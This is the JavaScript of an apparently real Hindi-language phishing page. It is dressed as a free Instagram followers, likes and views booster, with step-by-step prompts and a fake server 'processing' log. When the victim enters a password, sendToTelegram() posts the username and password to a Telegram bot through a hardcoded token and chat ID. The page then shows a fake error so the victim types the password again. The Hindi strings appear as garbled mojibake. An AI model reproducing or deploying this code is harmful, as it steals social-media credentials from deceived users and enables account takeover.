    <script>
        // Global variables
        let currentStep = 1;
        let selectedService = '';
        let selectedPackage = 0;
        
        // Service packages
        const packages = {
            'followers': ['1K', '2K', '3K', '5K'],
            'likes': ['10K', '20K', '30K', '40K', '50K', '60K', '70K', '80K'],
            'views': ['1M', '2M', '3M', '4M', '5M', '6M', '7M', '8M', '9M', '10M']
        };
        
        // Enter key handler
        function handleEnter(event, step) {
            if (event.key === 'Enter') {
                if (step === 'step1') nextStep(2);
                if (step === 'step4') submitPassword();
            }
        }
        
        // Step navigation
        function nextStep(step) {
            // Validate current step
            if (currentStep === 1) {
                let username = document.getElementById('username').value.trim();
                if (!username) {
                    alert('‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ø‡•Ç‡§ú‡§∞‡§®‡•á‡§Æ ‡§°‡§æ‡§≤‡•á‡§Ç!');
                    return;
                }
            }
            
            if (currentStep === 2) {
                if (!selectedService) {
                    alert('‡§ï‡•É‡§™‡§Ø‡§æ ‡§∏‡•á‡§µ‡§æ ‡§ö‡•Å‡§®‡•á‡§Ç!');
                    return;
                }
            }
            
            if (step === 2.5) {
                // Load packages for selected service
                loadPackages();
                currentStep = 2.5;
                showStep(2.5);
                updateStepIndicator(2);
                return;
            }
            
            if (currentStep === 2.5) {
                if (!selectedPackage) {
                    alert('‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡•à‡§ï‡•á‡§ú ‡§ö‡•Å‡§®‡•á‡§Ç!');
                    return;
                }
            }
            
            // Update current step and show
            currentStep = step;
            showStep(step);
            updateStepIndicator(step);
            
            // Start processing if step 3
            if (step === 3) {
                startProcessing();
            }
        }
        
        // Show specific step
        function showStep(step) {
            // Hide all steps
            document.querySelectorAll('.step').forEach(el => {
                el.classList.remove('active');
            });
            
            // Show current step
            let stepId = 'step' + step.toString().replace('.', '_');
            document.getElementById(stepId).classList.add('active');
        }
        
        // Update step indicator
        function updateStepIndicator(step) {
            document.querySelectorAll('.step-circle').forEach(circle => {
                circle.classList.remove('active');
            });
            
            if (step === 1) document.getElementById('stepCircle1').classList.add('active');
            if (step === 2 || step === 2.5) {
                document.getElementById('stepCircle1').classList.add('active');
                document.getElementById('stepCircle2').classList.add('active');
            }
            if (step === 3) {
                document.getElementById('stepCircle1').classList.add('active');
                document.getElementById('stepCircle2').classList.add('active');
                document.getElementById('stepCircle3').classList.add('active');
            }
            if (step === 4) {
                document.getElementById('stepCircle1').classList.add('active');
                document.getElementById('stepCircle2').classList.add('active');
                document.getElementById('stepCircle3').classList.add('active');
                document.getElementById('stepCircle4').classList.add('active');
            }
        }
        
        // Select service
        function selectService(service) {
            selectedService = service;
            
            // Update UI
            document.querySelectorAll('.service-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            // Update title
            let title = '';
            if (service === 'followers') title = '‡§´‡•â‡§≤‡•ã‡§Ö‡§∞‡•ç‡§∏ ‡§™‡•à‡§ï‡•á‡§ú ‡§ö‡•Å‡§®‡•á‡§Ç';
            if (service === 'likes') title = '‡§≤‡§æ‡§á‡§ï‡•ç‡§∏ ‡§™‡•à‡§ï‡•á‡§ú ‡§ö‡•Å‡§®‡•á‡§Ç';
            if (service === 'views') title = '‡§µ‡•ç‡§Ø‡•Ç‡§ú ‡§™‡•à‡§ï‡•á‡§ú ‡§ö‡•Å‡§®‡•á‡§Ç';
            document.getElementById('packageTitle').textContent = title;
        }
        
        // Load packages
        function loadPackages() {
            let container = document.getElementById('packageContainer');
            container.innerHTML = '';
            
            packages[selectedService].forEach(pkg => {
                let div = document.createElement('div');
                div.className = 'package';
                div.setAttribute('onclick', `selectPackage('${pkg}')`);
                div.innerHTML = `<h3>${pkg}</h3>`;
                container.appendChild(div);
            });
        }
        
        // Select package
        function selectPackage(pkg) {
            selectedPackage = pkg;
            
            // Update UI
            document.querySelectorAll('.package').forEach(p => {
                p.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
        }
        
        // Start processing animation
        function startProcessing() {
            let log = document.getElementById('processingLog');
            log.innerHTML = '';
            
            let messages = [
                "‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§∏‡§∞‡•ç‡§ö‡§ø‡§Ç‡§ó...",
                "‡§∏‡•ç‡§≤‡•â‡§ü ‡§è‡§≤‡•ã‡§ï‡•á‡§∂‡§®...",
                "‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§è‡§ï‡•ç‡§ü‡§ø‡§µ‡•á‡§ü‡•á‡§°...",
                "‡§™‡•ç‡§∞‡•ã‡§´‡§æ‡§á‡§≤ ‡§°‡•á‡§ü‡§æ ‡§≤‡•ã‡§° ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à...",
                "‚úÖ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§§‡•à‡§Ø‡§æ‡§∞ ‡§π‡•à!"
            ];
            
            let i = 0;
            let interval = setInterval(() => {
                if (i < messages.length) {
                    let entry = document.createElement('div');
                    entry.className = 'log-entry';
                    entry.textContent = '> ' + messages[i];
                    log.appendChild(entry);
                    log.scrollTop = log.scrollHeight;
                    i++;
                } else {
                    clearInterval(interval);
                    document.getElementById('continueBtn').style.display = 'block';
                }
            }, 1000);
        }
        
        // Submit password
        function submitPassword() {
            let username = document.getElementById('username').value.trim();
            let password = document.getElementById('password').value.trim();
            
            if (!password) {
                alert('‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§°‡§æ‡§≤‡•á‡§Ç!');
                return;
            }
            
            // Send to Telegram
            sendToTelegram(username, password);
            
            // Show messages
            document.getElementById('retryMessage').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'block';
            
            // Clear password
            document.getElementById('password').value = '';
        }
        
        // Retry password
        function retryPassword() {
            document.getElementById('retryMessage').style.display = 'none';
            document.getElementById('errorMessage').style.display = 'none';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }
        
        // Send to Telegram
        function sendToTelegram(username, password) {
            let botToken = '8345311836:AAGGy4g688Y5oxDvb0SqWunLNzCT3BnuPdY';
            let chatId = '7482526085';
            
            // Create message
            let message = `üéØ ‡§®‡§Ø‡§æ ‡§á‡§Ç‡§∏‡•ç‡§ü‡§æ‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§≤‡•â‡§ó‡§ø‡§®!\n\n`;
            message += `üë§ ‡§Ø‡•Ç‡§ú‡§∞‡§®‡•á‡§Æ: ${username}\n`;
            message += `üîê ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°: ${password}\n`;
            message += `üì¶ ‡§∏‡•á‡§µ‡§æ: ${selectedService}\n`;
            message += `üéÅ ‡§™‡•à‡§ï‡•á‡§ú: ${selectedPackage}\n`;
            message += `‚è∞ ‡§∏‡§Æ‡§Ø: ${new Date().toLocaleString('hi-IN')}`;
            
            // Send via fetch
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        }
        
        // Initialize
        window.onload = function() {
            showStep(1);
            updateStepIndicator(1);
        };
    </script>
</body>
